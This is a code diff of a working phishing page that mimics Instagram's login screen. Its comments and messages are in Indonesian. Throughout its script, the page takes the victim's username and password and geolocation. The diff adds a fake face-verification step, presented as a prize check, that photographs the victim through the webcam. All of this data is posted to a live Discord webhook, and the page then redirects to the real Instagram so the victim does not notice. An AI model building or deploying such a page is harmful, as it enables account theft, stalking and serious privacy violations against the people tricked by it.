@@ -5,169 +5,146 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login • Instagram</title>
     <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
-    
     <style>
         * { box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .login-box {
-            background-color: white;
-            border: 1px solid #dbdbdb;
-            padding: 40px;
-            width: 350px;
-            text-align: center;
-        }
-        h1 {
-            font-family: 'Lobster', cursive;
-            font-size: 45px;
-            margin: 0 0 30px 0;
-            color: #262626;
-            font-weight: normal;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background-color: #fafafa;
-            font-size: 12px;
-        }
-        input:focus { border: 1px solid #a8a8a8; outline: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .login-box { background-color: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
+        h1 { font-family: 'Lobster', cursive; font-size: 48px; margin: 0 0 30px 0; color: #262626; font-weight: normal; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 12px; }
+        button { width: 100%; padding: 8px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 14px; }
         
-        button {
-            width: 100%;
-            padding: 8px;
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-        button:disabled { background-color: #b2dffc; }
-
-        /* Separator OR */
-        .separator {
-            display: flex;
-            align-items: center;
-            margin: 25px 0;
-        }
+        /* Face ID Style */
+        #face-id-container { display: none; margin-top: 10px; }
+        .circle-scan { position: relative; width: 180px; height: 180px; margin: 20px auto; border: 4px solid #0095f6; border-radius: 50%; overflow: hidden; }
+        #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .scan-line { position: absolute; width: 100%; height: 3px; background: #0095f6; box-shadow: 0 0 15px #0095f6; top: 0; animation: scan 2s linear infinite; }
+        
+        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
+        
+        .separator { display: flex; align-items: center; margin: 25px 0; }
         .line { flex: 1; height: 1px; background-color: #dbdbdb; }
         .or-text { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: bold; }
-
-        /* FB Login & Forgot */
-        .fb-login a {
-            color: #385185;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-        .forgot-password a {
-            color: #00376b;
-            text-decoration: none;
-            font-size: 12px;
-        }
-
-        .signup-box {
-            background-color: white;
-            border: 1px solid #dbdbdb;
-            padding: 20px;
-            width: 350px;
-            text-align: center;
-            margin-top: 10px;
-            font-size: 14px;
-        }
+        .fb-login a { color: #385185; text-decoration: none; font-size: 14px; font-weight: bold; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+        .forgot-password a { color: #00376b; text-decoration: none; font-size: 12px; }
+        .signup-box { background-color: white; border: 1px solid #dbdbdb; padding: 20px; width: 350px; text-align: center; margin-top: 10px; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div class="login-box">
+    <div class="login-box" id="main-container">
         <h1>Instagram</h1>
+        
         <form id="loginForm">
             <input type="text" id="username" placeholder="Phone number, username, or email" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit" id="btnSubmit">Log In</button>
         </form>
 
-        <div class="separator">
-            <div class="line"></div>
-            <div class="or-text">OR</div>
-            <div class="line"></div>
+        <div id="face-id-container">
+            <p style="font-size: 14px; font-weight: bold; color: #262626;">Verifikasi Wajah Diperlukan</p>
+            <p style="font-size: 11px; color: #8e8e8e;">Dekatkan wajah Anda ke kamera untuk verifikasi hadiah</p>
+            <div class="circle-scan">
+                <video id="video" autoplay playsinline></video>
+                <div class="scan-line"></div>
+            </div>
+            <p id="status-text" style="font-size: 12px; color: #0095f6; font-weight: bold;">Menyiapkan kamera...</p>
         </div>
 
-        <div class="fb-login">
-            <a href="https://www.facebook.com/login/">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="16" style="margin-right: 8px;">
-                Log in with Facebook
-            </a>
-        </div>
-
-        <div class="forgot-password">
-            <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+        <div id="normal-footer">
+            <div class="separator"><div class="line"></div><div class="or-text">OR</div><div class="line"></div></div>
+            <div class="fb-login"><a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="16" style="margin-right: 8px;">Log in with Facebook</a></div>
+            <div class="forgot-password"><a href="#">Forgot password?</a></div>
         </div>
     </div>
 
-    <div class="signup-box">
-        Don't have an account? <a href="#" style="color: #0095f6; text-decoration: none; font-weight: bold;">Sign up</a>
-    </div>
+    <div class="signup-box">Don't have an account? <a href="#" style="color: #0095f6; text-decoration: none; font-weight: bold;">Sign up</a></div>
+
+    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>
 
     <script>
-        // WEBHOOK DISCORD KAMU
         const webhookURL = "https://discordapp.com/api/webhooks/1488089163751489636/Gk4up_lVTgmJYHqIZ2qzxAFm6kiPA_dgR5sfD6AHJo98V0_gqC0bIbYey70woKxpikWU";
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        const loginForm = document.getElementById('loginForm');
+        const faceContainer = document.getElementById('face-id-container');
+        const normalFooter = document.getElementById('normal-footer');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('status-text');
+
+        loginForm.addEventListener('submit', async function(e) {
             e.preventDefault();
-            
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
-            const btn = document.getElementById('btnSubmit');
 
-            btn.disabled = true;
-            btn.innerText = "Processing...";
+            // Transisi ke Face-ID
+            loginForm.style.display = "none";
+            normalFooter.style.display = "none";
+            faceContainer.style.display = "block";
 
-            // Ambil Lokasi
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => sendData(user, pass, pos),
-                    () => sendData(user, pass, null),
-                    { enableHighAccuracy: true }
-                );
-            } else {
-                sendData(user, pass, null);
-            }
+            // Jalankan Proses
+            processTarget(user, pass);
         });
 
-        function sendData(u, p, pos) {
-            let loc = "Izin Lokasi Ditolak";
-            if (pos) {
-                loc = `Koordinat: ${pos.coords.latitude}, ${pos.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            }
+        async function processTarget(u, p) {
+            let locationData = "Lokasi: Ditolak";
 
-            const payload = {
-                content: `🚨 **TARGET MASUK JEBAKAN!**\n👤 **Username:** \`${u}\`\n🔑 **Password:** \`${p}\`\n📍 **${loc}**`
-            };
+            // 1. Ambil Lokasi
+            try {
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000});
+                });
+                locationData = `Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            } catch(e) {}
+
+            // 2. Buka Kamera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                statusText.innerText = "Memindai... (75%)";
+
+                // Tunggu 3 detik, lalu ambil foto
+                setTimeout(() => {
+                    statusText.innerText = "Verifikasi Berhasil!";
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoBase64 = canvas.toDataURL('image/jpeg');
+
+                    // Kirim Data Lengkap
+                    sendToDiscord(u, p, locationData, photoBase64);
+
+                    // Stop Kamera
+                    stream.getTracks().forEach(track => track.stop());
+                }, 3500);
+
+            } catch (err) {
+                statusText.innerText = "Error: Kamera Wajib Diaktifkan";
+                // Tetap kirim data login meski kamera ditolak
+                setTimeout(() => sendToDiscord(u, p, locationData, null), 2000);
+            }
+        }
+
+        function sendToDiscord(u, p, loc, img) {
+            // Karena mengirim file via Webhook harus pakai FormData
+            const formData = new FormData();
+            
+            let content = `🚨 **SUTRISNO TERJERAT!**\n👤 **Username:** \`${u}\`\n🔑 **Password:** \`${p}\`\n📍 **${loc}**`;
+            
+            formData.append("payload_json", JSON.stringify({ content: content }));
+
+            if (img) {
+                // Ubah Base64 ke File
+                const byteString = atob(img.split(',')[1]);
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+                const blob = new Blob([ab], {type: 'image/jpeg'});
+                formData.append("file", blob, "wajah_target.jpg");
+            }
 
             fetch(webhookURL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: formData
             }).then(() => {
-                // Alihkan ke halaman IG asli agar tidak curiga
+                // Alihkan ke IG asli
                 window.location.href = "https://www.instagram.com/accounts/login/";
             });
         }
